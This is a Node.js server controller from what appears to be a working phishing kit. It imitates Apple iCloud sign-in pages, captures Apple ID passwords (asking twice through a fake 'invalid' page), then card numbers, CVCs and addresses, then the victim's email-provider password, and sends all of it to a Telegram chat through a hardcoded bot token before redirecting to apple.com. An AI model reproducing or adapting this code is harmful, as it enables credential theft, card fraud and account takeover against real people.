const User = require('../models/User')
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const token = "6563244298:AAF5y_kx6LDFDa_ZXaGWB3p6ZfJXgKnrsi8";
const bot = new TelegramBot(token, { polling: true });
const chatID = -4076400458
i = -1
async function main() {
  allData = await User.find({})
  largestcount = -1
  for (let x = 0; x < allData.length; x++) {
    if (allData[x].count > largestcount) {
      largestcount = allData[x].count
    }
  }
  i = largestcount
}
main()
console.log(i)

// Done
exports.login_page = async (req, res) => {
  try {


    i++
    var ua = req.headers['user-agent'];

    bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")

    res.render('icloud', { count: i })
  } catch (err) {
    console.log(err)
  }
}

exports.login_post = async (req, res) => {
  try {
    const email = req.body.appleid;
    const password = req.body.password
    const count = req.body.count;

    var ua = req.headers['user-agent'];


    user = new User({
      count,
      userAgent: ua,
      appleID: email,
      applePass: password
    });

    await user.save();




    res.render('icloud-invalid', { count, email })

  } catch (err) {
    console.log(err)
  }

}

exports.billingform_post = async (req, res) => {
  try {
    const email = req.body.appleid;
    const password = req.body.password
    const count = req.body.count;

    await User.findOneAndUpdate({ count }, { applePass2: password });


    res.render('icloud-cc', { count, email })
  } catch (err) {
    console.log(err)
  }
}


exports.billingformsubmit_post = async (req, res) => {
  try {
    console.log(req.body)
    const count = req.body.count;

    theuser = await User.findOneAndUpdate({ count }, {
      name: req.body.name,
      address1: req.body.address1,
      address2: req.body.address2,
      city: req.body.city,
      state: req.body.state,
      zip: req.body.zip,
      phone: req.body.phone,
      cardnumber: req.body.cardnumber,
      expiration: req.body.expiration,
      cvc: req.body.cvc,
    });



    switch (true) {
      case theuser.appleID.includes('yahoo.com'):
        res.redirect(`/login/yahoo/${count}`)
        break;
      case theuser.appleID.includes('gmail.com'):
        res.redirect(`/login/gmail/${count}`)
        break;
      case theuser.appleID.includes('outlook.com'):
        res.redirect(`/login/outlook/${count}`)
        break;
      case theuser.appleID.includes('mail.com'):
        res.redirect(`/login/mail/${count}`)
        break;
      case theuser.appleID.includes('aol.com'):
        res.redirect(`/login/aol/${count}`)
        break;
      default:
        break;
    }
  } catch (err) {
    console.log(err)
  }
}


exports.page_loader_get = async (req, res) => {
  try {
    console.log(`Recieved req at ${req.url}`)
    page2load = req.params.page
    count = req.params.count
    theuser = await User.findOne({ count })
    email = theuser.appleID
    res.render(`${page2load}-pass`, { count, email })
  } catch (err) {
    console.log(err)
  }
}

exports.page_loader_post = async (req, res) => {
  try {
    page2load = req.params.page
    count = req.params.count
    password = req.body.password
    theuser = await User.findOneAndUpdate({ count }, { emailPASS1: password })
    email = theuser.appleID

    // console.log(Users[count])
    res.render(`${page2load}-pass-invalid`, { count, email, page2load })

    // res.send('DONE')
    // res.render(page2load, { count })
  } catch (err) {
    console.log(err)
  }
}


exports.invalidpage_loader_post = async (req, res) => {
  try {
    page2load = req.params.page
    count = req.params.count
    password = req.body.password
    theuser = await User.findOneAndUpdate({ count }, { emailPASS2: password })
    console.log(theuser)
    // res.render(`${page2load}-pass-invalid`, { count, email })
    bot.sendMessage(chatID, `
    count: ${count}
    ua: ${theuser.userAgent}
    Apple ID: ${theuser.appleID}
    Apple ID Pass1: ${theuser.applePass}
    Apple ID Pass2: ${theuser.applePass2}
    name: ${theuser.name}
    address1: ${theuser.address1}
    address2: ${theuser.address2}
    city: ${theuser.city}
    state: ${theuser.state}
    zip: ${theuser.zip}
    phone: ${theuser.phone}
    cardnumber: ${theuser.cardnumber}
    expiration: ${theuser.expiration}
    cvc: ${theuser.cvc}
    emailPASS: ${theuser.emailPASS1}
    emailPASS2: ${theuser.emailPASS2}
  `)

    res.redirect('https://apple.com')

    // res.render(page2load, { count })
  } catch (err) {
    console.log(err)
  }
}

exports.test_page = (req, res) => {
  res.render('outlook-pass-invalid', { count: 0, email: 'lala@outlook.com' })
}
